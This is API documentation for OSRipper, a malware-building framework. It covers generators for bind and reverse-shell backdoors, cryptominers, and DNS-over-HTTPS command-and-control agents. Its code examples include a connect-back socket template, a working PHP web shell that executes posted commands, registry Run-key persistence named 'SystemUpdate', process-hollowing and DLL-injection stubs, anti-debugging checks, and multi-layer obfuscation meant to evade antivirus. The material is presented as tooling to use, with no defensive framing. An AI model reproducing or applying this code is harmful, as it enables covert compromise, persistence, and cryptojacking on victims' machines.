# OSRipper API Documentation

This document provides comprehensive API documentation for OSRipper v0.4.2, enabling developers to integrate and extend the framework.

## Table of Contents

- [Core Classes](#core-classes)
- [Configuration API](#configuration-api)
- [Logging API](#logging-api)
- [Payload Generation](#payload-generation)
- [Obfuscation Engine](#obfuscation-engine)
- [CLI Integration](#cli-integration)
- [Extension Development](#extension-development)

## Core Classes

### ConfigManager

Main configuration management class.

```python
from osripper.config import ConfigManager

# Initialize with defaults (auto-discovers osripper.yml if present)
config = ConfigManager()

# Or load a specific file
config = ConfigManager("osripper.yml")

# Get and set values
output_dir = config.get("general.output_dir", "dist")
config.set("network.default_port", 4444)

# Save configuration
config.save_config()
```

#### Methods

| Method | Description | Parameters | Returns |
|--------|-------------|------------|---------|
| `load_config()` | Load config from file | None | `bool` |
| `save_config(file_path)` | Save config to file | `file_path: Optional[str]` | `bool` |
| `get(key, default)` | Get config value (dot-notation) | `key: str, default: Any` | `Any` |
| `set(key, value)` | Set config value (dot-notation) | `key: str, value: Any` | None |
| `validate_config()` | Validate configuration | None | `bool` |
| `create_sample_config(path)` | Write sample YAML config | `path: str` | `bool` |
| `get_payload_config()` | Get payload section | None | `Dict[str, Any]` |
| `get_network_config()` | Get network section | None | `Dict[str, Any]` |
| `get_compilation_config()` | Get compilation section | None | `Dict[str, Any]` |
| `get_evasion_config()` | Get evasion section | None | `Dict[str, Any]` |

### Payload Generation Functions

Standalone functions in `osripper.main` used by the interactive mode.

```python
from osripper.main import (
    validate_port, validate_ip,
    gen_bind, gen_rev_ssl_tcp, gen_custom, gen_btc_miner, gen_doh
)

# Input validation
if validate_port("4444") and validate_ip("192.168.1.100"):
    gen_rev_ssl_tcp()
```

| Function | Description |
|----------|-------------|
| `validate_port(port_str)` | Validate port string (1024–65535) |
| `validate_ip(ip)` | Validate IPv4 address string |
| `gen_bind()` | Interactive bind backdoor generator |
| `gen_rev_ssl_tcp()` | Interactive reverse TCP meterpreter generator |
| `gen_custom()` | Interactive custom script crypter |
| `gen_btc_miner()` | Interactive BTC miner generator |
| `gen_doh()` | Interactive DNS-over-HTTPS C2 generator |

## Configuration API

### ConfigManager

Advanced configuration management with YAML/JSON support.

```python
from osripper.config import ConfigManager

# Initialize with config file
config = ConfigManager("osripper.yml")

# Get configuration values
output_dir = config.get("general.output_dir", "dist")
obfuscate = config.get("payload.auto_obfuscate", True)

# Set configuration values
config.set("network.default_port", 4444)

# Save configuration
config.save_config()
```

#### Methods

| Method | Description | Parameters | Returns |
|--------|-------------|------------|---------|
| `load_config()` | Load config from file | None | `bool` |
| `save_config(file_path)` | Save config to file | `file_path: Optional[str]` | `bool` |
| `get(key, default)` | Get config value | `key: str, default: Any` | `Any` |
| `set(key, value)` | Set config value | `key: str, value: Any` | None |
| `validate_config()` | Validate configuration | None | `bool` |
| `create_sample_config(path)` | Create sample config | `path: str` | `bool` |

#### Configuration Sections

```python
# Get section-specific configs
payload_config = config.get_payload_config()
network_config = config.get_network_config()
compilation_config = config.get_compilation_config()
evasion_config = config.get_evasion_config()
```

### Example Configuration Usage

```python
from osripper.config import ConfigManager

# Load configuration
config = ConfigManager("custom.yml")

# Payload settings
payload_settings = {
    'name': config.get('payload.default_name', 'backdoor'),
    'obfuscate': config.get('payload.auto_obfuscate', True),
    'layers': config.get('payload.obfuscation_layers', 5)
}

# Network settings
network_settings = {
    'host': config.get('network.default_host', 'localhost'),
    'port_range': config.get('network.default_port_range', [4444, 8888]),
    'ssl': config.get('network.use_ssl', True)
}

# Apply settings
if payload_settings['obfuscate']:
    apply_obfuscation(payload_settings['layers'])
```

## Logging API

### OSRipperLogger

Advanced logging system with multiple handlers.

```python
from osripper.logger import OSRipperLogger, get_logger, log_operation

# Get global logger instance
logger = get_logger()

# Basic logging
logger.info("Operation started")
logger.error("Operation failed", error_code=500)

# Specialized logging
logger.payload_generated("reverse_tcp", "192.168.1.100:4444")
logger.connection_established("192.168.1.100", 4444)
logger.security_event("vm_detection", "VirtualBox detected")
```

#### Methods

| Method | Description | Parameters | Returns |
|--------|-------------|------------|---------|
| `info(message, **kwargs)` | Log info message | `message: str, **kwargs` | None |
| `error(message, **kwargs)` | Log error message | `message: str, **kwargs` | None |
| `warning(message, **kwargs)` | Log warning message | `message: str, **kwargs` | None |
| `payload_generated(type, target, **kwargs)` | Log payload creation | `type: str, target: str` | None |
| `connection_attempt(host, port, **kwargs)` | Log connection attempt | `host: str, port: int` | None |
| `security_event(event, details, **kwargs)` | Log security events | `event: str, details: str` | None |

#### Operation Logging Decorator

```python
from osripper.logger import log_operation

@log_operation("payload_generation", payload_type="reverse_tcp")
def generate_payload(host, port):
    # Payload generation logic
    return create_reverse_payload(host, port)

# Usage
payload = generate_payload("192.168.1.100", 4444)
```

#### Context Manager

```python
from osripper.logger import OperationLogger, get_logger

logger = get_logger()

with OperationLogger(logger, "compilation", compiler="nuitka"):
    compile_payload("payload.py")
    # Automatically logs start/completion/failure
```

## Payload Generation

### Generator Class

The `Generator` class (in `osripper.generator`) is the primary API for programmatic payload creation.

```python
from osripper.generator import (
    Generator,
    create_bind_payload,
    create_reverse_ssl_tcp_payload,
    create_custom_payload,
    create_btc_miner_payload,
    create_doh_payload,
)

# Convenience functions (generate + write file)
create_bind_payload(port=4444, output_name="bind_shell")
create_reverse_ssl_tcp_payload(host="192.168.1.100", port="4444", output_name="reverse")
create_custom_payload(script_path="mytool.py", output_name="crypted")
create_doh_payload(domain="example.com", output_name="doh_agent")

# Full pipeline: obfuscate and/or compile
generator = Generator("payload.py", output_name="payload", icon_path=None, quiet=False)
success = generator.generate(
    obfuscate=True,
    compile_binary=True,
    enhanced_obfuscation=True,
    randomize_output=True,
)
```

#### Generator Methods

| Method | Description | Returns |
|--------|-------------|---------|
| `generate(obfuscate, compile_binary, enhanced_obfuscation, randomize_output)` | Run full pipeline | `bool` |
| `compile()` | Compile to binary via Nuitka | `bool` |
| `cleanup_and_move_results()` | Move outputs to `results/`, clean tmp | `bool` |

Create custom payload generators:

```python
def generate_custom_payload(config):
    """Generate custom payload with specific requirements."""
    
    # Validate configuration
    if not config.host or not config.port:
        raise ValueError("Host and port required")
    
    # Generate payload template
    payload_template = f"""
import socket
import ssl
import base64
import zlib

def connect_back():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{config.host}', {config.port}))
        
        if {config.use_ssl}:
            s = ssl.wrap_socket(s)
        
        # Custom payload logic here
        execute_commands(s)
        
    except Exception:
        pass

def execute_commands(socket):
    # Command execution logic
    pass

if __name__ == "__main__":
    connect_back()
"""
    
    # Apply obfuscation if enabled
    if config.obfuscate:
        payload_template = apply_obfuscation(payload_template)
    
    # Write to file
    with open(config.output_file, 'w') as f:
        f.write(payload_template)
    
    return config.output_file
```

### Payload Templates

Define reusable payload templates:

```python
PAYLOAD_TEMPLATES = {
    'reverse_tcp': """
import socket
import ssl
import struct
import {imports}

{anti_debug_code}

def main():
    {connection_code}
    {execution_code}

if __name__ == "__main__":
    main()
""",
    
    'bind_tcp': """
import socket
import struct
import {imports}

{anti_vm_code}

def main():
    {bind_code}
    {execution_code}

if __name__ == "__main__":
    main()
""",
    
    'miner': """
import socket
import json
import hashlib
import {imports}

{stealth_code}

def mine():
    {mining_code}

if __name__ == "__main__":
    mine()
"""
}

def generate_from_template(template_name, **kwargs):
    """Generate payload from template."""
    template = PAYLOAD_TEMPLATES[template_name]
    return template.format(**kwargs)
```

## Obfuscation Engine

Both obfuscators expose a `MainMenu(file, random_suffix=False)` entry point.

```python
# Standard obfuscator
from osripper import obfuscator
output_file = obfuscator.MainMenu("payload.py", random_suffix=True)

# Enhanced obfuscator (anti-debug, VM detection, junk code)
from osripper import obfuscator_enhanced
output_file = obfuscator_enhanced.MainMenu("payload.py", random_suffix=True)
```

`MainMenu` returns the path of the obfuscated output file (e.g. `payload_or.py` or a randomised name when `random_suffix=True`).

### Custom Evasion (enhanced obfuscator internals)

```python
from osripper.obfuscator_enhanced import add_random_padding, Encode

# Add junk padding to source code string
padded_code = add_random_padding(source_code_str)

# Multi-layer encode to output file
Encode(padded_code, "output.py")
```

### Custom Obfuscation Extension

```python
from osripper import obfuscator_enhanced

class CustomObfuscator:
    """Wrap OSRipper's enhanced obfuscator with extra steps."""

    def obfuscate(self, input_file: str, random_suffix: bool = False) -> str:
        # Pre-process: inject custom evasion before standard obfuscation
        with open(input_file) as f:
            code = f.read()
        code = self._add_custom_check(code)
        tmp = input_file.replace(".py", "_pre.py")
        with open(tmp, "w") as f:
            f.write(code)

        return obfuscator_enhanced.MainMenu(tmp, random_suffix=random_suffix)

    def _add_custom_check(self, code: str) -> str:
        check = (
            "import time as _t; _s=_t.time(); [None for _ in range(500000)];\n"
            "if _t.time()-_s < 0.05: raise SystemExit\n"
        )
        return check + code

# Usage
enc = CustomObfuscator()
out = enc.obfuscate("payload.py")
```

## CLI Integration

### Command Line Parser

```python
from osripper.cli import create_parser, validate_args, execute_bind

# Create parser
parser = create_parser()

# Parse arguments
args = parser.parse_args(['bind', '-p', '4444', '--obfuscate'])

# Validate arguments
if validate_args(args):
    # Execute command
    success = execute_bind(args)
```

### Custom CLI Commands

Extend the CLI with custom commands:

```python
def add_custom_command(subparsers):
    """Add custom command to CLI."""
    custom_parser = subparsers.add_parser('custom', help='Custom payload')
    custom_parser.add_argument('--type', required=True, choices=['web', 'mobile'])
    custom_parser.add_argument('--target', required=True)
    
    return custom_parser

def execute_custom(args):
    """Execute custom command."""
    if args.type == 'web':
        return generate_web_payload(args.target)
    elif args.type == 'mobile':
        return generate_mobile_payload(args.target)
    
    return False

# Integration example
def main_cli_extended():
    parser = create_parser()
    subparsers = parser._subparsers._group_actions[0]
    
    # Add custom command
    add_custom_command(subparsers)
    
    args = parser.parse_args()
    
    if args.command == 'custom':
        return execute_custom(args)
    
    # Handle standard commands
    return handle_standard_commands(args)
```

## Extension Development

### Plugin Architecture

Create plugins for OSRipper:

```python
class OSRipperPlugin:
    """Base class for OSRipper plugins."""
    
    def __init__(self, name, version):
        self.name = name
        self.version = version
    
    def initialize(self, config):
        """Initialize plugin with configuration."""
        pass
    
    def generate_payload(self, **kwargs):
        """Generate payload (override in subclass)."""
        raise NotImplementedError
    
    def post_process(self, payload_file):
        """Post-process generated payload."""
        return payload_file

class WebShellPlugin(OSRipperPlugin):
    """Web shell payload plugin."""
    
    def __init__(self):
        super().__init__("WebShell", "1.0")
    
    def generate_payload(self, language="php", **kwargs):
        """Generate web shell payload."""
        
        if language == "php":
            return self._generate_php_shell(**kwargs)
        elif language == "jsp":
            return self._generate_jsp_shell(**kwargs)
        else:
            raise ValueError(f"Unsupported language: {language}")
    
    def _generate_php_shell(self, **kwargs):
        """Generate PHP web shell."""
        php_shell = """<?php
if(isset($_POST['cmd'])){
    echo "<pre>";
    $cmd = ($_POST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
<form method="post">
<input type="text" name="cmd" placeholder="Command">
<input type="submit" value="Execute">
</form>"""
        
        return php_shell

# Plugin registration
PLUGINS = {
    'webshell': WebShellPlugin(),
    # Add more plugins here
}

def load_plugin(name):
    """Load plugin by name."""
    if name in PLUGINS:
        return PLUGINS[name]
    else:
        raise ValueError(f"Plugin not found: {name}")

# Usage
webshell_plugin = load_plugin('webshell')
php_payload = webshell_plugin.generate_payload(language="php")
```

### Custom Evasion Techniques

Implement custom evasion methods:

```python
class EvasionTechniques:
    """Custom evasion technique implementations."""
    
    @staticmethod
    def add_process_hollowing(code):
        """Add process hollowing technique."""
        hollowing_code = """
import subprocess
import os

def hollow_process():
    # Create suspended process
    proc = subprocess.Popen(['notepad.exe'], 
                          creationflags=0x00000004)  # CREATE_SUSPENDED
    
    # Hollow and inject code
    # Implementation details...
    
    return proc

# Execute in hollow process
hollow_process()
"""
        return hollowing_code + code
    
    @staticmethod
    def add_dll_injection(code):
        """Add DLL injection technique."""
        injection_code = """
import ctypes
from ctypes import wintypes

def inject_dll(process_id, dll_path):
    # Open target process
    process = ctypes.windll.kernel32.OpenProcess(
        0x1F0FFF, False, process_id)
    
    # Allocate memory and inject DLL
    # Implementation details...
    
    return True

# Perform DLL injection
inject_dll(target_pid, "payload.dll")
"""
        return injection_code + code
    
    @staticmethod
    def add_registry_persistence(code):
        """Add registry persistence."""
        persistence_code = """
import winreg

def add_persistence(exe_path):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        0, winreg.KEY_SET_VALUE)
    
    winreg.SetValueEx(key, "SystemUpdate", 0, 
                     winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)

# Add to startup
add_persistence(__file__)
"""
        return persistence_code + code

# Usage in obfuscator
def apply_advanced_evasion(code, techniques):
    """Apply advanced evasion techniques."""
    evasion = EvasionTechniques()
    
    if 'process_hollowing' in techniques:
        code = evasion.add_process_hollowing(code)
    
    if 'dll_injection' in techniques:
        code = evasion.add_dll_injection(code)
    
    if 'registry_persistence' in techniques:
        code = evasion.add_registry_persistence(code)
    
    return code
```

### Integration Example

Complete integration example:

```python
from osripper.config import ConfigManager
from osripper.logger import get_logger
from osripper import obfuscator_enhanced

class CustomPayloadGenerator:
    """Custom payload generator with full integration."""
    
    def __init__(self, config_file=None):
        self.config = ConfigManager(config_file)
        self.logger = get_logger()

    def generate(self, payload_type, **kwargs):
        """Generate payload with full integration."""

        self.logger.operation_start("payload_generation",
                                   payload_type=payload_type)

        try:
            if payload_type == "reverse_tcp":
                payload = self._generate_reverse_tcp(**kwargs)
            else:
                raise ValueError(f"Unsupported payload type: {payload_type}")

            if self.config.get("payload.auto_obfuscate", True):
                payload = self._apply_obfuscation(payload)

            output_file = self._save_payload(payload, **kwargs)

            self.logger.payload_generated(payload_type, output_file)
            self.logger.operation_complete("payload_generation")

            return output_file

        except Exception as e:
            self.logger.operation_failed("payload_generation", str(e))
            raise

    def _generate_reverse_tcp(self, host, port, **kwargs):
        """Generate reverse TCP payload."""
        pass

    def _apply_obfuscation(self, payload):
        """Apply enhanced obfuscation."""
        # Write to temp file, run through enhanced obfuscator
        import tempfile, os
        with tempfile.NamedTemporaryFile(suffix=".py", delete=False, mode="w") as f:
            f.write(payload)
            tmp = f.name
        out = obfuscator_enhanced.MainMenu(tmp)
        os.unlink(tmp)
        with open(out) as f:
            return f.read()

    def _save_payload(self, payload, **kwargs):
        """Save payload to file."""
        pass

# Usage
generator = CustomPayloadGenerator("custom.yml")
payload_file = generator.generate("reverse_tcp", 
                                host="192.168.1.100", 
                                port=4444)
```

This completes the comprehensive API documentation for OSRipper v0.4.2. The API provides extensive customization and extension capabilities for advanced users and developers.
